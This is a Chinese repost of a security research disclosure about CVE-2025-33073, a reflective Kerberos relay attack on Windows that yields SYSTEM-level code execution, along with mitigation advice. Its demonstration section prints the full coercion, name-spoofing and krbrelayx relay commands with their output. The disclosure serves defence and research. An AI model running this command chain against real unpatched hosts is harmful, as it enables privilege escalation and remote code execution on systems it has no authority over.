---
title: 反思自身——反射式 Kerberos 中继攻击
url: https://mp.weixin.qq.com/s/igP_bnnZmBsAVkbE71APPw
source: Doonsec's feed
date: 2026-06-16
fetch_date: 2026-06-17T07:01:37.046595
---

# 反思自身——反射式 Kerberos 中继攻击

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0HPcHv33ibLdNmzKPbrFvuEhcXSstNQSUUJh95F3RlVrXzAYOxQjXriaYSIjSZz65nd9V0dOE1oPCl2doWhNNCthUoSqRA51TobQ/0?wx_fmt=jpeg)

# 反思自身——反射式 Kerberos 中继攻击

Ots安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

在信息安全领域，一个令人遗憾的事实是，有些漏洞似乎永远不会彻底消失。一些早已修复的漏洞会一次又一次地死灰复燃，卷土重来。在研究中继攻击（Active Directory 的一大祸害）的过程中，我们意外地发现了反射中继攻击。自 2008 年 MS08-068漏洞发布以来，将 NTLM 消息中继回发起该消息的主机已不可能。到了 2025 年，我们不禁自问：如果我们尝试使用 Kerberos 呢？

事实证明，这个问题最终促成了反射式 Kerberos 中继攻击的发现。它不仅绕过了 NTLM 反射的限制，还利用了权限提升漏洞。如果您能够迫使任何 Windows 主机通过 SMB 协议向您进行身份验证，您就可以将该计算机帐户的 Kerberos 票证中继回主机，从而获取NT AUTHORITY\SYSTEM权限并执行远程代码。

针对此漏洞的补丁已于 2025 年 6 月 10 日的“补丁星期二”发布。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0GOGkyzyc0S4J0RlKIR3kJkVNKJqjGXTurMrNLsFRyUvjka68B0OIagyLgy81VVxdmelHvqNQvIM4FuNtVPx7reGqiaKt2ic9K3Y/640?wx_fmt=webp&from=appmsg)

CVE-2025-33073 - 反射型 Kerberos 中继攻击

反射式 Kerberos 中继攻击是一种利用漏洞 CVE-2025-33073 的技术，该漏洞由 RedTeam Pentesting 于 2025 年 1 月发现。我们已将该漏洞以白皮书的形式披露给微软，并已将其与安全公告 一起发布在我们的网站上。作为“补丁星期二”计划的一部分，缓解措施已于 2025 年 6 月 10 日发布。我们希望借此机会，以更简洁的方式总结该问题，并分享我们的一些看法。

此次攻击的原理是，我们诱使一台 Windows 主机通过 SMB 连接到我们的攻击系统，并使用 Kerberos 进行身份验证。然后，Kerberos 票据通过 SMB 再次转发到同一主机。由于诱使连接通常会导致相应计算机帐户的身份验证成功，我们预期会获得一个权限较低的 SMB 会话，该会话的权限与该计算机帐户的权限相同。然而，实际情况却是，生成的 SMB 会话拥有NT AUTHORITY\SYSTEM足以执行任意命令的高权限。

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0Gl1By0AmuN7ibPuecNZpefKPbBYG4SsB6RIes9LV2vkn2zpqKhEibzBYGyjRH0vclN2j9A4SKYFtuGhOwFyowoeC2MDN7GEJtYI/640?wx_fmt=webp&from=appmsg)

这个概念听起来很简单，但结果却出人意料。然而，在实践中，要使这种攻击奏效，需要克服不少障碍。我们的白皮书详细阐述了这些障碍及其影响，但这里先概括一下：

* 身份验证强制：攻击始于身份验证强制。这是一种众所周知的技术，它允许低权限帐户通过 DCERPC 连接到 Windows 主机，并强制其使用自身的计算机帐户连接到攻击系统并进行身份验证。我们在之前的博文《2025 年 Windows 强制技术终极指南》中描述了这项技术背后的理论以及当前可用的技术。了解强制技术的局限性至关重要，因为这些局限性决定了哪些主机最终会受到反射式 Kerberos 中继攻击。
* 解耦强制目标和服务主体名称：强制 Kerberos 身份验证并非易事。如果我们强制连接到攻击系统，Kerberos 仅在攻击系统拥有自己的服务主体名称时才会使用，在这种情况下，如果我们转发票据，票据将被拒绝。而这正是 由Google Project Zero 的 James ForshawCredUnmarshalTargetInfo/CREDENTIAL\_TARGET\_INFORMATIONW首创的技巧所在。该技巧允许我们注册一个指向攻击系统的主机名，从而使 Kerberos 票据被颁发给一个完全不同的主机。利用这种技术，我们能够收到原本发往同一主机的 Kerberos 票据。
* 绕过 NTLM 优先级：由于上述技巧，Windows 似乎认为它正在连接自身，在这种情况下，NTLM 的优先级实际上高于 Kerberos。因此，我们需要修改 krbrelayx ，使其声明完全不支持 NTLM，从而强制使用 Kerberos 身份验证。您可以在我们的论文中找到修改后的版本。

有证据证明，否则就等于没发生过！

这样我们就最终得到了一个合适的工单，可以将其转发给主机。让我们看看实际操作中是如何实现的：

第一步是强制身份验证。在本例中，我们使用我们全新的工具wspcoerce 进行强制身份验证client1，但您应该查看我们之前的博客文章以了解其他方法：

```
$ wspcoerce 'lab.redteam/user1:KojbyRyibdinWom)@client1.lab.redteam' \
    file:////client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA/path
Impacket v0.13.0.dev0+20250408.175013.349160df - Copyright 2023 Fortra

[*] Connected to IPC$
[*] Opened MsFteWds pipe
[*] Sent WSP Connect
[*] Sent WSP Query
[*] Sent WSP Disconnect
```

请注意，目标client1除了 Base64 编码之外，还包含主机名CREDENTIAL\_TARGET\_INFORMATIONW。这会导致client1 系统请求自身的服务票证，并将其发送到完整主机名解析到的任何位置。您可以 在这里阅读更多关于这项巧妙技术的信息。无论如何，我们必须确保整个主机名解析到我们的攻击系统。我们可以通过在 Active Directory 集成 DNS 中注册该主机名来实现这一点，或者直接使用 Pretender来响应本地名称解析查询（请查看我们关于 Pretender 的博客文章以了解更多信息）：

```
$ sudo pretender -i eth1 --no-dhcp-dns --no-timestamps \
    --spoof '*1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA*'
Pretender by RedTeam Pentesting v1.3.2-74e629fcc5
Listening on interface: eth1
IPv4 relayed to: 192.168.56.11
IPv6 relayed to: fe80::a00:27ff:fe89:bdac
Answering queries for: *1uwhrcaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaybaaaa*

[mDNS] listening via UDP on [ff02::fb%eth1]:5353
[NetBIOS] listening via UDP on192.168.56.255:137
[LLMNR] listening via UDP on [ff02::1:3%eth1]:5355
[mDNS] listening via UDP on224.0.0.251:5353
[LLMNR] listening via UDP on224.0.0.252:5355
[...]
[mDNS] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (A) queried by192.168.56.10 (client1.lab.redteam)
[mDNS] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (A) queried by fe80::6698:d1c7:60cb:8eb9 (client1.lab.redteam, 192.168.56.10)
[mDNS] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (AAAA) queried by192.168.56.10 (PCSSystemtec)
[mDNS] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (AAAA) queried by fe80::6698:d1c7:60cb:8eb9 (client1.lab.redteam, 192.168.56.10)
[LLMNR] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (A) queried by fe80::6698:d1c7:60cb:8eb9 (client1.lab.redteam, 192.168.56.10)
[LLMNR] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (A) queried by192.168.56.10 (client1.lab.redteam)
[LLMNR] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (AAAA) queried by fe80::6698:d1c7:60cb:8eb9 (client1.lab.redteam, 192.168.56.10)
[LLMNR] "client11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" (AAAA) queried by192.168.56.10 (client1.lab.redteam)
```

最后，我们可以将票据转发回去client1并执行代码，就像使用已修补的krbrelayx.pyNT AUTHORITY\SYSTEM版本 一样（您可以在我们的论文中找到细微的差别）：

```
$ krbrelayx.py --target smb://client1.lab.redteam -c whoami
[...]
[*] SMBD: Received connection from192.168.56.10
[*] Service RemoteRegistry isin stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Executed specified command on host: client1.lab.redteam
nt authority\system

[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

但为什么？

遗憾的是，我们目前尚不清楚为何这会导致权限提升，但我们有一些推测。不过需要注意的是，我们并未进行任何逆向工程或调试来验证这些推测的正确性。

Windows 针对本地环回身份验证提供了一种安全机制，它会将 Kerberos 票证关联回创建该票证的进程。这对于防止本地用户绕过 UAC（用户帐户控制）至关重要，正如James Forshaw 在此处所述。简而言之，它阻止了持有受 UAC 限制的令牌的用户通过环回网络身份验证访问本地主机，从而启动一个使用全新、不受限制的令牌的进程。通过将身份验证关联回源进程，可以重用原始的受限制令牌，同时 UAC 限制仍然有效。

然而，在反射式 Kerberos 中继攻击中，情况恰恰相反。在这种情况下，高权限NT AUTHORITY\SYSTEM帐户使用低权限计算机帐户的凭据进行身份验证client1$ 。Windows 似乎对这种攻击感到困惑，认为我们正在进行环回身份验证，因为 SPN 引用了它自己的主机名。因此，将票据链接到原始进程的两个结构（KERB\_AD\_RESTRICTION\_ENTRY和 ）被包含在票据中。 如果使用低权限帐户进行身份验证后，重用原始进程的进程令牌而不是创建一个新的令牌，会发生什么？没错，我们继承了权限！我们滥用了权限提升缓解措施来提升权限。KERB\_LOCALclient1$NT AUTHORITY\SYSTEM

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0HqcZciag4R4TriaBjd0J2Cib3bEr9dwpxdQwW579YWicR4utXSTVpnAxZlxZqiboWbOgcuMrLgJibuR7A5C36ThMIEULI3h7G3vke48/640?wx_fmt=webp&from=appmsg)

至少，这是我们的推测。

那么，哪些人最容易受到伤害？

如前所述，微软已于6月10日星期二的补丁日修复了该漏洞。我们没有机会测试微软采取的缓解措施，也不清楚他们具体做了哪些修复。

我们仍然希望概述一下补丁发布前的情况，以便您判断问题的严重性：

我们已在 Windows 10、11 以及 Server 2019 至 2025 上重现了此漏洞。目前我们尚未发现任何不受此漏洞影响的版本。然而，存在漏洞和可被利用是两回事。要真正利用此漏洞，必须同时实现强制访问和 SMB 中继。

我们在之前的博文中详细介绍了哪些强制转换技术适用于哪些 Windows 版本。简而言之，SMB 强制转换对于所有客户端以及 23H2 之前的服务器都应该始终可靠。对于 23H2 或更高版本的服务器，其有效性取决于其他因素。

除非强制执行服务器端 SMB 签名，否则 SMB 中继是可行的。对于客户端，自 Windows 11 24H2 起默认强制执行，但对于服务器，默认情况下仅在域控制器上强制执行。

要点总结

我们现在看到越来越多的基于中继的 Kerberos 攻击向量，这些攻击向量都建立在 Kerberos 中继技术之父 James Forshaw 的基础之上。基于这一基础，近年来涌现出许多攻击实现。在Dirk-jan Mollema 实现 DNS 动态更新攻击向量之后， CredUnmarshalTargetInfo 技巧 和用于 SPN 混淆的 LLMNR 欺骗的实现也只是时间问题 。这些攻击，以及利用 Kerberos 的反射中继攻击的复兴，都强烈表明我们对 Kerberos 中继仍有很多需要学习的地方。我们期待未来能够开展和阅读更多关于此主题的研究，尤其是在 NTLM 最终被弃用之后。请记住：适用于 NTLM 的并不一定适用于 Kerberos。

另一个重要的结论是，越来越明显的是，仅仅废除 NTLM 并就万事大吉是不够的。所有用于修补 NTLM 这艘摇摇欲坠的巨轮漏洞的小型缓解措施，例如 SMB 或 LDAP 签名、通道绑定和 EPA，对于 Kerberos 也同样至关重要。微软也一直在努力，在新版 Windows 中默认启用越来越多的此类功能。因此，如果您正在致力于保护您的 Windows 域，那么采取积极主动的措施是明智之举。您不仅应该准备好自行禁用 NTLM，还应该尽快启用安全功能。Windows 中会不断发现新的漏洞，但即使在补丁发布之前，这些漏洞也很有可能在您的域中无法被利用。在您检查安全设置之前，请记住，服务器端签名策略远比客户端策略重要。

最后，我们想谈谈我们的漏洞披露经历。过去，一些研究人员与微软有过一些分歧，最近的例子就是Akamai 在其精彩的博文 BadSuccessor 中披露的dMSA 漏洞。然而，我们通过 MSRC 进行漏洞披露的经历是积极的。微软已经承认了该问题，并根据我们认为合适的严重性进行了评级，而且在三个月的披露期限内发布了补丁。遗憾的是，微软最初拒绝了我们的漏洞赏金申请，理由是该漏洞属于 Windows Insider Preview 漏洞赏金计划的范畴，并且默认情况下无法利用。这是因为 Windows 11 Insider Preview 默认启用了服务器端 SMB 签名。我们要求微软重新考虑，因为我们怀疑该漏洞可能并非 SMB 特有，而是 Kerberos 协议特有的，而 SMB 签名配置仅影响我们在研究中采用的、最容易被利用的攻击向量。出乎意料的是，这促使微软重新评估了漏洞赏金的立场，并承诺奖励我们 5000 美元。总的来说，我们认为这是一个出色且成功的披露过程的范例，而且我们感觉微软的人员确实听取了我们的意见。

**END**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0EcNHKE9JPib9Licia2B6xu7LmD4iblPSNmSuL5NRMkzMAhiaTjLWIszT7N3iboohkpOicsHKvK1l7jGIXmo9rG2RacvYCe5CNN9QSicgU/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tadhkzMbpPpSw6NfJHUgsHudwQFGS0EobaB49HVwda7L2eJiaDMvwpakagffpPgepM6gBZzpCncMMHg/0?wx_fmt=png)

Ots安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二...